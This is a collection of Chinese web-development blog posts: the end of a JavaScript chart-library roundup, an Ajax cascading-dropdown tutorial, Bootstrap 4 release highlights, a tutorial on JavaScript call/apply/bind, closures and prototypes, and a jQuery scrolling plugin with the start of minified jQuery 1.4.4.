C3.js 提供了一种不同于 D3 学习曲线的方法，它将构建整个图表所需要的代码进行了包装。C3允许你创建自定义的类，这样就可以生成自己的风格。它提供了大量的API和回调，以便你可以在第一次渲染之后更新图表。
源码许可证：开源。对所有人免费。
17. Rickshaw

Rickshaw 在 Shutterstock 被开发为一个建时间序列图的工具包。像其他一些我们已经讨论过的工具一样，Rickshaw 也是基于 D3 库。它是开放并开源的（遵循 MIT 许可）。
你可以在这里看到一些 Rickshaw 的有趣例子。Rickshaw 的众多扩展和自定义的特性能够让你生成漂亮的时序图。
源码许可证：开源。对所有人免费。
18. Cubism.js

Cubism 也许是显示时间序列最佳的 D3 插件。是什么使它脱颖而出的呢？你可以引入多个来源的数据，比如 Graphite、Cube 和其他来创造令人敬畏的实时图表来展现你的数据。
它能够渲染增量，使用 Canvas 来一次一个像素的偏移图表。Cubism 的水平图要比标准的平面图更好地利用垂直空间，能够让你一眼下来获取更多的数据并增加一目了然的可能性。
源码许可证：开源。对所有人免费。
19. Plottable.js

Plottable 采取了一些不同于 D3 框架的方法。它已经有一套可插拔的模块化组件，这些组件封装了渲染逻辑。这形成了一个单独的布局引擎用来实际定位。
这意味着你可以使用任何 Plottable 的组件并将其添加到现有的图表，或使用 Plottable 创建一个全新的。它基本以一个更模块化、即插即用的方式赋予了你 D3 的力量。可以通过这些示例看一下 Plottable 的能力。
源码许可证：开源。对所有人免费。
 20. Canvas.js

正如名字所隐含的，Canvas.js 是一个 HTML5 —— JavaScript 的图表库，基于 Canvas 元素。Canvas 允许你创建完全响应式的且跨设备的丰富图表。除此之外，它有许多很好看的主题，他们声称要比传统的基于 Flash 和 SVG 图型快10倍。
源码许可证：非商业免费，商业用途收费。

21. ECharts.js / Enterprise Charts 商业产品图表库



ECharts，缩写来自Enterprise Charts，提供商业产品常用图表，底层基于ZRender（一个全新的轻量级canvas类库），创建了坐标系，图例，提示，工具箱等基础组件，并在此上构建出折线图、柱状图、散点图、K线图、饼图、雷达图、地图、和弦图、力导向布局图、仪表盘以及漏斗图，同时支持任意维度的堆积和多图表混合展现。


源码许可证：开源。对所有人免费。托管到了GitHub上。

总结
数据的可视化和分析是当今业务流程的的一个重要的组成部分。公司不论大小，都需要简洁、高效、互动性的方式来诠释数据。这使得选择适合你需求的 JavaScript 图标库显得尤为重要。
像 FusionCharts，GoogleCharts，Dygraphs 或 D3 的衍生库可能更适合那些处理大量数据的企业，或那些很大程度上依赖于数据分析的小公司。如果你只需要一些小而快的库，Morris.js 或 Chart.js 或许更适合你。对于图形和和网络，Cytoscape 或 Sigma.js 可能是更好的选择。
我尽量将最好的工具包括在这里，但我相信你也有你的最爱。顺便说一下。你最喜欢的 JS 图表库是哪个，为什么？请在下面的评论中分享你的想法。

本文最初发表在oschina，文章内容属作者个人观点，不代表本站立场。

版权声明：本文为博主原创文章，未经博主允许不得转载。

Ajax提高篇（7）Ajax实现简单的下拉框联动显示数据
页面中的两个下拉列表框：<tr>

                <td style="width: 130px">

                    所在学院：</td>

                <td style="width: 100px">

                    <select id="college" style="width: 200px" runat="server" onchange="changcollege(this.value)">

                        <option value="0">

                            --请选择所在学院学院--

                       </option>

                    </select></td>

            </tr>

            <tr>

                <td style="width: 130px">

                    所在专业：</td>

                <td style="width: 100px">

                    <select id="specialty" style="width: 200px" runat="server" onchange="SaveSpecical(this.value)">

                        <option value="0">

                            --请选择所在专业--

                       </option>

                    </select></td>

            </tr>
JS脚本代码<script type="text/javascript">
var http_request = false;
function send_request(method,url,content,responseType,callback)//定义发送请求的函数
{
    http_request=false;
    if(window.XMLHttpRequest)
    {
        http_request=new XMLHttpRequest();
        if(http_request.overrideMimeType)
        {
            http_request.overrideMimeType("text/xml");
        }
    }
    else
    {
        try
        {
            http_request=new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch(e)
        {
            try
            {
                http_request=new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch(e)
            {}
        }
    }
    if(!http_request)
    {
        window.alert("创建XMLHttpRequest对象失败");
        return false;
    }
    if(responseType.toLowerCase()=="text")
    {
        http_request.onreadystatechange=callback;
    }
    else
    {
        
        window.alert("ERR");
        return false;
    }
    if(method.toLowerCase()=="get")
    {
        http_request.open(method,url,true);
    }
    else if(method.toLowerCase()=="post")
    {
        http_request.open(method,url,true);
        http_request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    }
    else
    {
        window.alert("Err");
        return false;
    }
    http_request.send(content);
}

function changcollege(va)//当学院下拉列表发生改变时触发的脚本事件
{
    if(va!='0')
    {
        var speciality = document.getElementById("specialty");
        speciality.disabled=false;
        
        var url="Handler.ashx?type=college&id="+va;
        send_request("GET",url,null,"text",populateClass3);
    }
}
function populateClass3()//Ajax执行成功的回调函数
{
    var f=document.getElementById("specialty");
    if(http_request.readyState==4)
    {
            if(http_request.status==200)
            {
                var list=http_request.responseText;
                var classList=list.split("|");
                f.options.length=1;
                for(var i=0;i<classList.length;i++)
                        //将取得的结果添加到下级的列表框中
                {
                    var tmp=classList[i].split(",");
                    f.add(new Option(tmp[1],tmp[0]));
                }
            }
            else
            {
                alert("您所请求的页面有异常。");
            }
    }
}    
</script>  我们将http请求发送给服务端的Handler.ashx进行处理 public class Handler : IHttpHandler 
{

    public void ProcessRequest(HttpContext context)
    {
        string type = context.Request.QueryString["type"];
        if (type.Equals("college"))
        {
            string id = context.Request.QueryString["id"];
            context.Response.ContentType = "text/plain";
            context.Response.Write(getSpecialty(id));//这个是从数据库中根据传来省的id 查询出来的。学院的名字和主键，主键以便去查专业的名字
        }
    }

    public string getSpecialty(string college)
    {
        DataSet ds = GetInformation.GetSpecialtyInfo(college);
        string str = "";
        for (int i = 0; i < ds.Tables[0].Rows.Count; i++)
        {
            if (i == ds.Tables[0].Rows.Count - 1)
            {
                str += ds.Tables[0].Rows[i]["SpecialtyID"].ToString() + "," + ds.Tables[0].Rows[i]["SpecialtyName"].ToString();
            }
            else
            {
                str += ds.Tables[0].Rows[i]["SpecialtyID"].ToString() + "," + ds.Tables[0].Rows[i]["SpecialtyName"].ToString() + "|";
            }
        }
        return str.Trim();
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

} 根据学院的编号获得相应的专业，并将专业的名称用“|”分割组合成字符串返回给客户端，客户端脚本拆分字符串添加到下拉框中。 这里只是二级的联动显示，三级联动数据的现实原理是一样的。 

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

Bootstrap 4 更新的新功能（全）

Bootstrap 4中有太多重大的更新，本文不能面面俱到，下面是一些颇受关注的亮点：







从Less迁移到Sass： 现在，Bootstrap已加入Sass的大家庭中。得益于Libsass，Bootstrap的编译速度比以前更快；


改进网格系统：新增一个网格层适配移动设备，并整顿语义混合。


支持选择弹性盒模型（flexbox）：这是项划时代的功能——只要修改一个Boolean变量，就可以利用flexbox的优势快速布局。


废弃了wells、thumbnails和panels，使用cards代替：Cards是个全新概念，但使用起来与wells、thumbnails及panels很像，且更方便。


将所有HTML重置样式表整合到Reboot中：在用不了Normalize.css的地方可以用Reboot了，它提供了更多选项。例如box-sizing: border-box、margin tweaks等都存放在一个单独的 Sass 文件中。


新的自定义选项：不再像上个版本一样，将渐变、淡入淡出、阴影等效果分放在单独的样式表中。而是将所有选项都移到一个Sass变量中。想要给全局或考虑不到的角落定义一个默认效果？很简单，只要更新变量值，然后重新编译就可以了。


不再支持IE8，使用rem和em单位：放弃对IE8的支持意味着开发者可以放心地利用CSS的优点，不必研究css hack技巧或回退机制了。使用rem和em代替px单位，更适合做响应式布局，控制组件大小。如果要支持IE8，只能继续用Bootstrap 3。


重写所有JavaScript插件：为了利用JavaScript的新特性，Bootstrap 4用ES6重写了所有插件。现在提供UMD支持、泛型拆解方法、选项类型检查等特性。


改进工具提示和popovers自动定位：这部分要感谢Tether工具的帮助。


改进文档：所有文档以Markdown格式重写，添加了一些方便的插件组织示例和代码片段，文档使用起来会更方便，搜索的优化工作也在进行中。


更多变化：支持自定义窗体控件、空白和填充类，此外还包括新的实用程序类等。





以上更新只是冰山一角， v4版共有1100多次commits和 12万行代码更新，这些更新可以在v4-alpha文档 中查看。

版权声明：本文为博主原创文章，未经博主允许不得转载。

js apply/call/caller/callee/bind使用方法与区别分析
一、call 方法 
调用一个对象的一个方法，以另一个对象替换当前对象(其实就是更改对象的内部指针，即改变对象的this指向的内容)。 
Js代码 
call([thisObj[,arg1[, arg2[, [,.argN]]]]]) 
参数 
thisObj 
可选项。将被用作当前对象的对象。 
arg1, arg2, , argN 
可选项。将被传递方法参数序列。 
说明 
call 方法可以用来代替另一个对象调用一个方法。call 方法可将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。如果没有提供 thisObj 参数，那么 Global 对象被用作 thisObj。
Js代码 
 代码如下:

<input type="text" id="myText" value="input text"> Code 
function Obj(){this.value="对象！";} 
var value="global 变量"; 
function Fun1(){alert(this.value);} 
window.Fun1(); //global 变量 
Fun1.call(window); //global 变量 
Fun1.call(document.getElementById('myText')); //input text 
Fun1.call(new Obj()); //对象！ 


Js代码 
Code 
 代码如下:

var first_object = { 
num: 42 
}; 
var second_object = { 
num: 24 
}; 
function multiply(mult) { 
return this.num * mult; 
} 
multiply.call(first_object, 5); // returns 42 * 5 
multiply.call(second_object, 5); // returns 24 * 5 


二、apply方法 
apply方法的第一个参数也是要传入给当前对象的对象，即函数内部的this。后面的参数都是传递给当前对象的参数。 
对于apply和call两者在作用上是相同的，但两者在参数上有区别的。对于第一个参数意义都一样，但对第二个参数：apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，而call则作为call的参数传入（从第二个参数开始）。
如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3])同时使用apply的好处是可以直接将当前函数的arguments对象作为apply的第二个参数传入。
Js代码 
代码如下:

var func=new function(){this.a="func"} 
var myfunc=function(x,y){ 
var a="myfunc"; 
alert(this.a); 
alert(x + y); 
} 
myfunc.call(func,"var"," fun");// "func" "var fun" 
myfunc.apply(func,["var"," fun"]);// "func" "var fun" 


三、caller 属性 
返回一个对函数的引用，即调用了当前函数的函数体。 
functionName.caller :functionName 对象是所执行函数的名称。 
说明: 
对于函数来说，caller 属性只有在函数执行时才有定义。 如果函数是由 JScript 程序的顶层调用的，那么 caller 包含的就是 null 。如果在字符串上下文中使用 caller 属性，那么结果和 functionName.toString 一样，也就是说，显示的是函数的反编译文本。
Js代码 
代码如下:

function CallLevel(){ 
if (CallLevel.caller == null) 
alert("CallLevel was called from the top level."); 
else 
alert("CallLevel was called by another function:\n"+CallLevel.caller); 
} 
function funCaller(){ 
CallLevel(); 
} 
CallLevel(); 
funCaller() 


四、callee属性 
返回正被执行的 Function 对象，也就是所指定的 Function 对象的正文。 
[function.]arguments.callee:可选项 function 参数是当前正在执行的 Function 对象的名称。 
说明: 
callee 属性的初始值就是正被执行的 Function 对象。 
callee 属性是 arguments 对象的一个成员，它表示对函数对象本身的引用，这有利于匿 
函数的递归或者保证函数的封装性，例如下边示例的递归计算1到n的自然数之和。而该属性 
仅当相关函数正在执行时才可用。还有需要注意的是callee拥有length属性，这个属性有时 
用于验证还是比较好的。arguments.length是实参长度，arguments.callee.length是 
形参长度，由此可以判断调用时形参长度是否和实参长度一致。 
Js代码 
代码如下:

//callee可以打印其本身 
function calleeDemo() { 
alert(arguments.callee); 
} 
//用于验证参数 
function calleeLengthDemo(arg1, arg2) { 
if (arguments.length==arguments.callee.length) { 
window.alert("验证形参和实参长度正确！"); 
return; 
} else { 
alert("实参长度：" +arguments.length); 
alert("形参长度： " +arguments.callee.length); 
} 
} 
//递归计算 
var sum = function(n){ 
if (n <= 0) 
return 1; 
else 
return n ＋arguments.callee(n - 1) 
} 


五、bind 
Js代码 
代码如下:

var first_object = { 
num: 42 
}; 
var second_object = { 
num: 24 
}; 
function multiply(mult) { 
return this.num * mult; 
} 
Function.prototype.bind = function(obj) { 
var method = this, 
temp = function() { 
return method.apply(obj, arguments); 
}; 
return temp; 
} 
var first_multiply = multiply.bind(first_object); 
first_multiply(5); // returns 42 * 5 
var second_multiply = multiply.bind(second_object); 
second_multiply(5); // returns 24 * 5 


六、JS闭包(Closure) 
所谓“闭包”，指的是一个拥有许多变量和绑定了这些变量的环境的表达式（通常是一个函数），因而这些变量也是该表达式的一部分。 
关于闭包，最简单的描述就是 ECMAScript 允许使用内部函数－－即函数定义和函数表达式位于另一个函数的函数体内。而且，这些内部函数可以访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。也就是说，内部函数会在外部函数返回后被执行。而当这个内部函数执行时，它仍然必需访问其外部函数的局部变量、参数以及其他内部函数。这些局部变量、参数和函数声明（最初时）的值是外部函数返回时的值，但也会受到内部函数的影响。
简而言之，闭包的作用就是在out function执行完并返回后，闭包使得Javascript的垃圾回收机制GC不会收回out function所占用的资源，因为out function的内部函数inner function的执行需要依赖out function中的变量。
闭包的两个特点： 
1、作为一个函数变量的一个引用 - 当函数返回时，其处于激活状态。 
2、一个闭包就是当一个函数返回时，一个没有释放资源的栈区。 
例1： 
Html代码 
代码如下:

<script type="text/javascript"> 
function setupSomeGlobals() { 
// Local variable that ends up within closure 
var num = 666; 
// Store some references to functions as global variables 
gAlertNumber = function() { alert(num); } 
gIncreaseNumber = function() { num++; } 
gSetNumber = function(x) { num = x; } 
} 
</script> 
<button onclick="setupSomeGlobals()">生成 - setupSomeGlobals()</button> 
<button onclick="gAlertNumber()">输出值 - gAlertNumber()</button> 
<button onclick="gIncreaseNumber()">增加 - gIncreaseNumber()</button> 
<button onclick="gSetNumber(5)">赋值5 - gSetNumber(5)</button> 


例2： 
Html代码 
 代码如下:

<script type="text/javascript"> 
function newClosure(someNum, someRef) { 
// Local variables that end up within closure 
var num = someNum; 
var anArray = [1,2,3]; 
var ref = someRef; 
return function(x) { 
num += x; 
anArray.push(num); 
alert('num: ' + num + 
' nanArray ' + anArray.toString() + 
' nref.someVar ' + ref.someVar); 
} 
} 
var closure1 = newClosure(40, {someVar:' never-online'}) 
var closure2 = newClosure(99, {someVar:' BlueDestiny'}) 
closure1(4) 
closure2(3) 
</script> 


例3： 
Js代码 
代码如下:

<script language="javascript"> 
/* 声明一个全局变量 - getImgInPositionedDivHtml - 并将一次调用一个外部函数表达式返回的内部函数赋给它。 
这个内部函数会返回一个用于表示绝对定位的 DIV 元素包围着一个 IMG 元素 的 HTML 字符串，这样一来， 
所有可变的属性值都由调用该函数时的参数提供： 
*/ 
var getImgInPositionedDivHtml = (function(){ 
/* 外部函数表达式的局部变量 - buffAr - 保存着缓冲数组。这个数组只会被创建一次，生成的数组实例对内部函数而言永远是可用的 
因此，可供每次调用这个内部函数时使用。 
其中的空字符串用作数据占位符，相应的数据 
将由内部函数插入到这个数组中： 
*/ 
var buffAr = [ 
'<div id="', 
'', //index 1, DIV ID 属性 
'" style="position:absolute;top:', 
'', //index 3, DIV 顶部位置 
'px;left:', 
'', //index 5, DIV 左端位置 
'px;width:', 
'', //index 7, DIV 宽度 
'px;height:', 
'', //index 9, DIV 高度 
'px;overflow:hidden;\"><img src=\"', 
'', //index 11, IMG URL 
'\" width=\"', 
'', //index 13, IMG 宽度 
'\" height=\"', 
'', //index 15, IMG 调蓄 
'\" alt=\"', 
'', //index 17, IMG alt 文本内容 
'\"><\/div>' 
]; 
/* 返回作为对函数表达式求值后结果的内部函数对象。 
这个内部函数就是每次调用执行的函数 
- getImgInPositionedDivHtml( ... ) - 
*/ 
return (function(url, id, width, height, top, left, altText){ 
/* 将不同的参数插入到缓冲数组相应的位置： 
*/ 
buffAr[1] = id; 
buffAr[3] = top; 
buffAr[5] = left; 
buffAr[13] = (buffAr[7] = width); 
buffAr[15] = (buffAr[9] = height); 
buffAr[11] = url; 
buffAr[17] = altText; 
/* 返回通过使用空字符串（相当于将数组元素连接起来） 
连接数组每个元素后形成的字符串： 
*/ 
return buffAr.join(''); 
}); //:内部函数表达式结束。 
})();//自调用 
alert(getImgInPositionedDivHtml);//显示返回的函数 
alert(getImgInPositionedDivHtml("img.gif","img",100,50,0,0,"Test")); 
</script> 


说明：其中的关键技巧在于通过执行一个单行（in-line）函数表达式创建一个额外的执行环境，而将该函数表达式返回的内部函数作为在外部代码中使用的函数。此时，缓冲数组被定义为函数表达式的一个局部变量。这个函数表达式只需执行一次，而数组也只需创建一次，就可以供依赖它的函数重复使用。
七、原型链 
ECMAScript 为 Object 类型定义了一个内部 [[prototype]] 属性。这个属性不能通过脚本直接访问，但在属性访问器解析过程中，则需要用到这个内部[[prototype]] 属性所引用的对象链－－即原型链。可以通过一个公共的 prototype 属性，来对与内部的 [[prototype]] 属性对应的原型对象进行赋值或定义。
例1： 
Js代码 
 代码如下:

<script language="javascript"> 
function NumObject(formalParameter){ 
this.testNumber = formalParameter; 
} 
function StrObject(formalParameter){ 
this.testString = formalParameter; 
} 
//用 NumObject类的实例替换了所有与 StrObject类的实例相关联的原型。 
StrObject.prototype =new NumObject(6); 
var objRef = new StrObject( "String_Value" ); 
//当某个属性访问器尝试读取由 objectRef 所引用的对象的属性值时，整个原型链都会被搜索。 
//不论是在对象或对象的原型中，读取命名属性值的时候只返回首先找到的属性值。而当为对象的命名属性赋值时，如果对象自身不存在该属性则创建相应的属性。 
alert(objRef.testString);//output "String_Value" 
alert(objRef.testNumber);//output "6" 
alert(objRef.toString); 
//StrObject 的实例拥有一个原型链。该链中的第一个对象是在创建后被指定给 StrObject 构造函数的 prototype 属性的 NumObject 的一个实例。NumObject 的实例也有一个原型，即与 Object.prototype 所引用的对象对应的默认的 Object 对象的原型。最后， Object.prototype 有一个值为 null 的原型，因此这条原型链到此结束。
objRef.testNumber = 3;//对象自身不存在该属性则创建相应的属性 
alert(objRef.testNumber);//自身有了属性，属性访问器不会再进一步搜索原型链 
alert(NumObject.prototype.isPrototypeOf(objRef));// output "true" 
</script> 



版权声明：本文为博主原创文章，未经博主允许不得转载。

jQuery 间歇式无缝滚动特效分享(三张图片平行滚动)
最近项目中门户首页需要做出图片间歇式无缝滚动特效，但是在网上找资料都是不太理想，不过可以指导。最后自己写了一个demo实现了这个特效，分享出来。
1、jquery.cxscroll.js

/*!
 * jQuery cxScroll 1.2.1
 * http://code.ciaoca.com/
 * https://github.com/ciaoca/cxScroll
 * E-mail: ciaoca@gmail.com
 * Released under the MIT license
 * Date: 2014-03-10
 */
(function($){
	$.fn.cxScroll=function(settings){
		if(!this.length){return};
		settings=$.extend({},$.cxScroll.defaults,settings);

		var obj=this;
		var scroller={
			lock:false,
			dom:{}
		};

		scroller.init=function(){
			scroller.dom.box=obj.find(".box");
			scroller.dom.list=scroller.dom.box.find(".list");
			scroller.dom.items=scroller.dom.list.find("li");
			scroller.itemSum=scroller.dom.items.length;

			// 没有元素或只有1个元素时，不进行滚动
			if(scroller.itemSum<=1){return};

			scroller.dom.prevBtn=obj.find(".prev");
			scroller.dom.nextBtn=obj.find(".next");
			scroller.itemWidth=scroller.dom.items.outerWidth();
			scroller.itemHeight=scroller.dom.items.outerHeight();

			if(settings.direction=="left"||settings.direction=="right"){
				// 容器宽度不足时，不进行滚动
				if(scroller.itemWidth*scroller.itemSum<=scroller.dom.box.outerWidth()){return};

				scroller.prevVal="left";
				scroller.nextVal="right";
				scroller.moveVal=scroller.itemWidth;
			}else{
				// 容器高度不足时，不进行滚动
				if(scroller.itemHeight*scroller.itemSum<=scroller.dom.box.outerHeight()){return};

				scroller.prevVal="top";
				scroller.nextVal="bottom";
				scroller.moveVal=scroller.itemHeight;
			};

			// 元素：后补
			scroller.dom.list.append(scroller.dom.list.html());

			// 添加元素：手动操作按钮
			if(settings.prevBtn&&!scroller.dom.prevBtn.length){
				scroller.dom.prevBtn=$("<a></a>",{"class":"prev"}).prependTo(obj);
			};
			if(settings.nextBtn&&!scroller.dom.nextBtn.length){
				scroller.dom.nextBtn=$("<a></a>",{"class":"next"}).prependTo(obj);
			};

			// 事件：鼠标移入停止，移出开始
			if(settings.auto){
				obj.hover(function(){
					settings.auto=false;
					scroller.lock=false;
					scroller.off();
				},function(){
					settings.auto=true;
					scroller.lock=false;
					scroller.on();
				});
			};

			scroller.bindEvents();
			scroller.on();
		};
		
		scroller.bindEvents=function(){
			if(settings.nextBtn&&scroller.dom.prevBtn.length){
				scroller.dom.nextBtn.bind("click",function(){
					if(!scroller.lock){
						scroller.goto(scroller.nextVal,settings.accel);
					};
				});
			};
			if(settings.prevBtn&&scroller.dom.prevBtn.length){
				scroller.dom.prevBtn.bind("click",function(){
					if(!scroller.lock){
						scroller.goto(scroller.prevVal,settings.accel);
					};
				});
			};
		};

		// 方法：开始
		scroller.on=function(){
			if(!settings.auto){return};
			if(typeof(scroller.run)!=="undefined"){
				clearTimeout(scroller.run);
			};

			scroller.run=setTimeout(function(){
				scroller.goto(settings.direction);
			},settings.time);
		};

		// 方法：停止
		scroller.off=function(){
			scroller.dom.box.stop(true);
			if(typeof(scroller.run)!=="undefined"){
				clearTimeout(scroller.run);
			};
		};

		// 方法：滚动
		scroller.goto=function(d,t){
			scroller.off();
			if(settings.controlLock){
				scroller.lock=true;
			};

			var _max;	// _max	滚动的最大限度
			var _dis;	// _dis	滚动的距离
			var _speed=t||settings.speed;

			switch(d){
				case "left":
				case "top":
					_max=0;
					if(d=="left"){
						if(parseInt(scroller.dom.box.scrollLeft(),10)==0){
							scroller.dom.box.scrollLeft(scroller.itemSum*scroller.moveVal);
						};
						_dis=scroller.dom.box.scrollLeft()-(scroller.moveVal*settings.step);
						if(_dis%scroller.itemWidth>0){
							_dis-=(_dis%scroller.itemWidth)-scroller.itemWidth;
						};
						if(_dis<_max){_dis=_max};
						scroller.dom.box.animate({"scrollLeft":_dis},_speed,settings.easing,function(){
							if(parseInt(scroller.dom.box.scrollLeft(),10)<=_max){
								scroller.dom.box.scrollLeft(0);
							};
						});
					}else{
						if(parseInt(scroller.dom.box.scrollTop(),10)==0){
							scroller.dom.box.scrollTop(scroller.itemSum*scroller.moveVal);
						};
						_dis=scroller.dom.box.scrollTop()-(scroller.moveVal*settings.step);
						if(_dis%scroller.itemHeight>0){
							_dis-=(_dis%scroller.itemHeight)-scroller.itemHeight;
						};
						if(_dis<_max){_dis=_max};
						scroller.dom.box.animate({"scrollTop":_dis},_speed,settings.easing,function(){
							if(parseInt(scroller.dom.box.scrollTop(),10)<=_max){
								scroller.dom.box.scrollTop(0);
							};
						});
					};
					break;
	
				case "right":
				case "bottom":
					_max=scroller.itemSum*scroller.moveVal;
					if(d=="right"){
						_dis=scroller.dom.box.scrollLeft()+(scroller.moveVal*settings.step);
						if(_dis%scroller.itemWidth>0){
							_dis-=(_dis%scroller.itemWidth);
						};
						if(_dis>_max){_dis=_max};
						scroller.dom.box.animate({"scrollLeft":_dis},_speed,settings.easing,function(){
							if(parseInt(scroller.dom.box.scrollLeft(),10)>=_max){
								scroller.dom.box.scrollLeft(0);
							};
						});
					}else{
						_dis=scroller.dom.box.scrollTop()+(scroller.moveVal*settings.step);
						if(_dis%scroller.itemHeight>0){
							_dis-=(_dis%scroller.itemHeight);
						};
						if(_dis>_max){_dis=_max};
						scroller.dom.box.animate({"scrollTop":_dis},_speed,settings.easing,function(){
							if(parseInt(scroller.dom.box.scrollTop(),10)>=_max){
								scroller.dom.box.scrollTop(0);
							};
						});
					};
					break;
				
				// not default
			};
			
			scroller.dom.box.queue(function(){
				if(settings.controlLock){
					scroller.lock=false;
				};
				scroller.on();
				$(this).dequeue();
			});
		};

		scroller.init();
	};

	// 默认值
	$.cxScroll={defaults:{
		direction:"right",	// 滚动方向
		easing:"swing",		// 缓动方式
		step:1,				// 滚动步长
		accel:160,			// 手动滚动速度
		speed:1000,			// 自动滚动速度
		time:5000,			// 自动滚动间隔时间
		auto:true,			// 是否自动滚动
		prevBtn:true,		// 是否使用 prev 按钮
		nextBtn:true,		// 是否使用 next 按钮
		safeLock:true		// 滚动时是否锁定控制按钮
	}};
})(jQuery);
2、jquery.cxscroll.min.js


/*!
 * jQuery cxScroll 1.2.1
 * http://code.ciaoca.com/
 * https://github.com/ciaoca/cxScroll
 * E-mail: ciaoca@gmail.com
 * Released under the MIT license
 * Date: 2014-03-10
 */
!function(a){a.fn.cxScroll=function(b){var c,d;this.length&&(b=a.extend({},a.cxScroll.defaults,b),c=this,d={lock:!1,dom:{}},d.init=function(){if(d.dom.box=c.find(".box"),d.dom.list=d.dom.box.find(".list"),d.dom.items=d.dom.list.find("li"),d.itemSum=d.dom.items.length,!(d.itemSum<=1)){if(d.dom.prevBtn=c.find(".prev"),d.dom.nextBtn=c.find(".next"),d.itemWidth=d.dom.items.outerWidth(),d.itemHeight=d.dom.items.outerHeight(),"left"==b.direction||"right"==b.direction){if(d.itemWidth*d.itemSum<=d.dom.box.outerWidth())return;d.prevVal="left",d.nextVal="right",d.moveVal=d.itemWidth}else{if(d.itemHeight*d.itemSum<=d.dom.box.outerHeight())return;d.prevVal="top",d.nextVal="bottom",d.moveVal=d.itemHeight}d.dom.list.append(d.dom.list.html()),b.prevBtn&&!d.dom.prevBtn.length&&(d.dom.prevBtn=a("<a></a>",{"class":"prev"}).prependTo(c)),b.nextBtn&&!d.dom.nextBtn.length&&(d.dom.nextBtn=a("<a></a>",{"class":"next"}).prependTo(c)),b.auto&&c.hover(function(){b.auto=!1,d.lock=!1,d.off()},function(){b.auto=!0,d.lock=!1,d.on()}),d.bindEvents(),d.on()}},d.bindEvents=function(){b.nextBtn&&d.dom.prevBtn.length&&d.dom.nextBtn.bind("click",function(){d.lock||d.goto(d.nextVal,b.accel)}),b.prevBtn&&d.dom.prevBtn.length&&d.dom.prevBtn.bind("click",function(){d.lock||d.goto(d.prevVal,b.accel)})},d.on=function(){b.auto&&("undefined"!=typeof d.run&&clearTimeout(d.run),d.run=setTimeout(function(){d.goto(b.direction)},b.time))},d.off=function(){d.dom.box.stop(!0),"undefined"!=typeof d.run&&clearTimeout(d.run)},d.goto=function(c,e){var f,g,h;switch(d.off(),b.controlLock&&(d.lock=!0),h=e||b.speed,c){case"left":case"top":f=0,"left"==c?(0==parseInt(d.dom.box.scrollLeft(),10)&&d.dom.box.scrollLeft(d.itemSum*d.moveVal),g=d.dom.box.scrollLeft()-d.moveVal*b.step,g%d.itemWidth>0&&(g-=g%d.itemWidth-d.itemWidth),f>g&&(g=f),d.dom.box.animate({scrollLeft:g},h,b.easing,function(){parseInt(d.dom.box.scrollLeft(),10)<=f&&d.dom.box.scrollLeft(0)})):(0==parseInt(d.dom.box.scrollTop(),10)&&d.dom.box.scrollTop(d.itemSum*d.moveVal),g=d.dom.box.scrollTop()-d.moveVal*b.step,g%d.itemHeight>0&&(g-=g%d.itemHeight-d.itemHeight),f>g&&(g=f),d.dom.box.animate({scrollTop:g},h,b.easing,function(){parseInt(d.dom.box.scrollTop(),10)<=f&&d.dom.box.scrollTop(0)}));break;case"right":case"bottom":f=d.itemSum*d.moveVal,"right"==c?(g=d.dom.box.scrollLeft()+d.moveVal*b.step,g%d.itemWidth>0&&(g-=g%d.itemWidth),g>f&&(g=f),d.dom.box.animate({scrollLeft:g},h,b.easing,function(){parseInt(d.dom.box.scrollLeft(),10)>=f&&d.dom.box.scrollLeft(0)})):(g=d.dom.box.scrollTop()+d.moveVal*b.step,g%d.itemHeight>0&&(g-=g%d.itemHeight),g>f&&(g=f),d.dom.box.animate({scrollTop:g},h,b.easing,function(){parseInt(d.dom.box.scrollTop(),10)>=f&&d.dom.box.scrollTop(0)}))}d.dom.box.queue(function(){b.controlLock&&(d.lock=!1),d.on(),a(this).dequeue()})},d.init())},a.cxScroll={defaults:{direction:"right",easing:"swing",step:1,accel:160,speed:800,time:4e3,auto:!0,prevBtn:!0,nextBtn:!0,safeLock:!0}}}(jQuery);

3、jquery-1.4.4.min.js


/*!
 * jQuery JavaScript Library v1.4.4
 * http://jquery.com/
 *
 * Copyright 2010, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2010, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Thu Nov 11 19:04:53 2010 -0500
 */
(function(E,B){function ka(a,b,d){if(d===B&&a.nodeType===1){d=a.getAttribute("data-"+b);if(typeof d==="string"){try{d=d==="true"?true:d==="false"?false:d==="null"?null:!c.isNaN(d)?parseFloat(d):Ja.test(d)?c.parseJSON(d):d}catch(e){}c.data(a,b,d)}else d=B}return d}function U(){return false}function ca(){return true}function la(a,b,d){d[0].type=a;return c.event.handle.apply(b,d)}function Ka(a){var b,d,e,f,h,l,k,o,x,r,A,C=[];f=[];h=c.data(this,this.nodeType?"events":"__events__");if(typeof h==="function")h=
h.events;if(!(a.liveFired===this||!h||!h.live||a.button&&a.type==="click")){if(a.namespace)A=RegExp("(^|\\.)"+a.namespace.split(".").join("\\.(?:.*\\.)?")+"(\\.|$)");a.liveFired=this;var J=h.live.slice(0);for(k=0;k<J.length;k++){h=J[k];h.origType.replace(X,"")===a.type?f.push(h.selector):J.splice(k--,1)}f=c(a.target).closest(f,a.currentTarget);o=0;for(x=f.length;o<x;o++){r=f[o];for(k=0;k<J.length;k++){h=J[k];if(r.selector===h.selector&&(!A||A.test(h.namespace))){l=r.elem;e=null;if(h.preType==="mouseenter"||
